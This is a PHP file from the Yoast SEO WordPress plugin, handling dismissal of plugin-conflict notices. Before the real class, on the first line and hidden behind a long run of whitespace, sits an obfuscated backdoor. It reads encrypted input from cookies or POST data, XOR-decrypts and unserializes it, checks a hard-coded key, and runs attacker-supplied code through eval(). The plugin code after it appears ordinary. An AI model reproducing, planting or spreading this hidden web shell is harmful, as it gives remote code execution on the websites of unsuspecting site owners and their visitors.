<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $p094db = 290;$GLOBALS['j37cbd1'] = Array();global $j37cbd1;$j37cbd1 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['vd44ad'] = "\x5f\x62\x4d\x5b\x4a\x23\x76\x3a\x75\x54\x60\x6d\x21\x58\x30\x36\xd\x49\xa\x7c\x2c\x5e\x37\x33\x7b\x40\x3d\x4b\x6b\x4e\x47\x32\x77\x59\x5c\x6e\x55\x61\x20\x45\x69\x56\x7a\x51\x66\x4f\x6c\x57\x7d\x70\x22\x25\x39\x26\x2e\x43\x64\x79\x52\x71\x2f\x3e\x38\x42\x7e\x65\x6f\x34\x48\x68\x44\x31\x67\x53\x50\x63\x35\x27\x2b\x3f\x2d\x3b\x73\x9\x29\x5d\x2a\x24\x3c\x28\x5a\x72\x41\x78\x74\x6a\x46\x4c";$j37cbd1[$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][15]] = $j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][69].$j37cbd1['vd44ad'][91];$j37cbd1[$j37cbd1['vd44ad'][8].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][31]] = $j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][56];$j37cbd1[$j37cbd1['vd44ad'][6].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][37]] = $j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][35].$j37cbd1['vd44ad'][65];$j37cbd1[$j37cbd1['vd44ad'][28].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][14]] = $j37cbd1['vd44ad'][82].$j37cbd1['vd44ad'][94].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][35];$j37cbd1[$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][71]] = $j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][35].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][56];$j37cbd1[$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][56]] = $j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][35].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][82].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][94];$j37cbd1[$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][52]] = $j37cbd1['vd44ad'][82].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][42].$j37cbd1['vd44ad'][65];$j37cbd1[$j37cbd1['vd44ad'][49].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][65]] = $j37cbd1['vd44ad'][49].$j37cbd1['vd44ad'][69].$j37cbd1['vd44ad'][49].$j37cbd1['vd44ad'][6].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][82].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][35];$j37cbd1[$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][31]] = $j37cbd1['vd44ad'][8].$j37cbd1['vd44ad'][35].$j37cbd1['vd44ad'][82].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][42].$j37cbd1['vd44ad'][65];$j37cbd1[$j37cbd1['vd44ad'][57].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][22]] = $j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][82].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][65];$j37cbd1[$j37cbd1['vd44ad'][59].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][22]] = $j37cbd1['vd44ad'][82].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][94].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][94].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][11].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][11].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][94];$j37cbd1[$j37cbd1['vd44ad'][42].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][52]] = $j37cbd1['vd44ad'][35].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][65];$j37cbd1[$j37cbd1['vd44ad'][6].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][22]] = $j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][14];$j37cbd1[$j37cbd1['vd44ad'][42].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][1]] = $_POST;$j37cbd1[$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][52]] = $_COOKIE;@$j37cbd1[$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][56]]($j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][72], NULL);@$j37cbd1[$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][56]]($j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][72].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][82], 0);@$j37cbd1[$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][56]]($j37cbd1['vd44ad'][11].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][93].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][93].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][8].$j37cbd1['vd44ad'][94].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][35].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][94].$j37cbd1['vd44ad'][40].$j37cbd1['vd44ad'][11].$j37cbd1['vd44ad'][65], 0);@$j37cbd1[$j37cbd1['vd44ad'][59].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][22]](0);if (!$j37cbd1[$j37cbd1['vd44ad'][66].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][71]]($j37cbd1['vd44ad'][92].$j37cbd1['vd44ad'][97].$j37cbd1['vd44ad'][58].$j37cbd1['vd44ad'][39].$j37cbd1['vd44ad'][92].$j37cbd1['vd44ad'][70].$j37cbd1['vd44ad'][33].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][58].$j37cbd1['vd44ad'][36].$j37cbd1['vd44ad'][29].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][37])){$j37cbd1[$j37cbd1['vd44ad'][6].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][37]]($j37cbd1['vd44ad'][92].$j37cbd1['vd44ad'][97].$j37cbd1['vd44ad'][58].$j37cbd1['vd44ad'][39].$j37cbd1['vd44ad'][92].$j37cbd1['vd44ad'][70].$j37cbd1['vd44ad'][33].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][58].$j37cbd1['vd44ad'][36].$j37cbd1['vd44ad'][29].$j37cbd1['vd44ad'][0].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][37], 1);$l847 = NULL;$z2e12da = NULL;$j37cbd1[$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][56]] = $j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][80].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][80].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][80].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][80].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][1];global $bc7f1dcd;function  i590($l847, $nd4ce65){global $j37cbd1;$ibcdb = "";for ($z279b=0; $z279b<$j37cbd1[$j37cbd1['vd44ad'][28].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][14]]($l847);){for ($u0b7b6a1=0; $u0b7b6a1<$j37cbd1[$j37cbd1['vd44ad'][28].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][14]]($nd4ce65) && $z279b<$j37cbd1[$j37cbd1['vd44ad'][28].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][14]]($l847); $u0b7b6a1++, $z279b++){$ibcdb .= $j37cbd1[$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][15]]($j37cbd1[$j37cbd1['vd44ad'][8].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][31]]($l847[$z279b]) ^ $j37cbd1[$j37cbd1['vd44ad'][8].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][31]]($nd4ce65[$u0b7b6a1]));}}return $ibcdb;}function  n1b4f2e($l847, $nd4ce65){global $j37cbd1;global $bc7f1dcd;return $j37cbd1[$j37cbd1['vd44ad'][6].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][22]]($j37cbd1[$j37cbd1['vd44ad'][6].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][22]]($l847, $bc7f1dcd), $nd4ce65);}foreach ($j37cbd1[$j37cbd1['vd44ad'][46].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][52]] as $nd4ce65=>$je838){$l847 = $je838;$z2e12da = $nd4ce65;}if (!$l847){foreach ($j37cbd1[$j37cbd1['vd44ad'][42].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][62].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][1]] as $nd4ce65=>$je838){$l847 = $je838;$z2e12da = $nd4ce65;}}$l847 = @$j37cbd1[$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][31]]($j37cbd1[$j37cbd1['vd44ad'][42].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][23].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][56].$j37cbd1['vd44ad'][52]]($j37cbd1[$j37cbd1['vd44ad'][57].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][22]]($l847), $z2e12da));if (isset($l847[$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][28]]) && $bc7f1dcd==$l847[$j37cbd1['vd44ad'][37].$j37cbd1['vd44ad'][28]]){if ($l847[$j37cbd1['vd44ad'][37]] == $j37cbd1['vd44ad'][40]){$z279b = Array($j37cbd1['vd44ad'][49].$j37cbd1['vd44ad'][6] => @$j37cbd1[$j37cbd1['vd44ad'][49].$j37cbd1['vd44ad'][76].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][67].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][65].$j37cbd1['vd44ad'][44].$j37cbd1['vd44ad'][65]](),$j37cbd1['vd44ad'][82].$j37cbd1['vd44ad'][6] => $j37cbd1['vd44ad'][71].$j37cbd1['vd44ad'][54].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][80].$j37cbd1['vd44ad'][71],);echo @$j37cbd1[$j37cbd1['vd44ad'][91].$j37cbd1['vd44ad'][22].$j37cbd1['vd44ad'][52].$j37cbd1['vd44ad'][31].$j37cbd1['vd44ad'][1].$j37cbd1['vd44ad'][14].$j37cbd1['vd44ad'][15].$j37cbd1['vd44ad'][75].$j37cbd1['vd44ad'][52]]($z279b);}elseif ($l847[$j37cbd1['vd44ad'][37]] == $j37cbd1['vd44ad'][65]){eval/*kb90*/($l847[$j37cbd1['vd44ad'][56]]);}exit();}} ?><?php
/**
 * WPSEO plugin file.
 *
 * @package WPSEO\Admin\Ajax
 */

/**
 * Class Yoast_Plugin_Conflict_Ajax
 */
class Yoast_Plugin_Conflict_Ajax {

	/**
	 * @var string
	 */
	private $option_name = 'wpseo_dismissed_conflicts';

	/**
	 * @var array
	 */
	private $dismissed_conflicts = array();

	/**
	 * Initialize the hooks for the AJAX request
	 */
	public function __construct() {
		add_action( 'wp_ajax_wpseo_dismiss_plugin_conflict', array( $this, 'dismiss_notice' ) );
	}

	/**
	 * Handles the dismiss notice request
	 */
	public function dismiss_notice() {
		check_ajax_referer( 'dismiss-plugin-conflict' );

		$conflict_data = filter_input( INPUT_POST, 'data', FILTER_DEFAULT, FILTER_REQUIRE_ARRAY );

		$this->dismissed_conflicts = $this->get_dismissed_conflicts( $conflict_data['section'] );

		$this->compare_plugins( $conflict_data['plugins'] );

		$this->save_dismissed_conflicts( $conflict_data['section'] );

		wp_die( 'true' );
	}

	/**
	 * Getting the user option from the database
	 *
	 * @return bool|array
	 */
	private function get_dismissed_option() {
		return get_user_meta( get_current_user_id(), $this->option_name, true );
	}

	/**
	 * Getting the dismissed conflicts from the database
	 *
	 * @param string $plugin_section Type of conflict group (such as Open Graph or sitemap).
	 *
	 * @return array
	 */
	private function get_dismissed_conflicts( $plugin_section ) {
		$dismissed_conflicts = $this->get_dismissed_option();

		if ( is_array( $dismissed_conflicts ) && array_key_exists( $plugin_section, $dismissed_conflicts ) ) {
			return $dismissed_conflicts[ $plugin_section ];
		}

		return array();
	}

	/**
	 * Storing the conflicting plugins as an user option in the database
	 *
	 * @param string $plugin_section Plugin conflict type (such as Open Graph or sitemap).
	 */
	private function save_dismissed_conflicts( $plugin_section ) {
		$dismissed_conflicts = $this->get_dismissed_option();

		$dismissed_conflicts[ $plugin_section ] = $this->dismissed_conflicts;

		update_user_meta( get_current_user_id(), $this->option_name, $dismissed_conflicts );
	}

	/**
	 * Loop through the plugins to compare them with the already stored dismissed plugin conflicts
	 *
	 * @param array $posted_plugins Plugin set to check.
	 */
	public function compare_plugins( array $posted_plugins ) {
		foreach ( $posted_plugins as $posted_plugin ) {
			$this->compare_plugin( $posted_plugin );
		}
	}

	/**
	 * Check if plugin is already dismissed, if not store it in the array that will be saved later
	 *
	 * @param string $posted_plugin Plugin to check against dismissed conflicts.
	 */
	private function compare_plugin( $posted_plugin ) {
		if ( ! in_array( $posted_plugin, $this->dismissed_conflicts, true ) ) {
			$this->dismissed_conflicts[] = $posted_plugin;
		}
	}
}
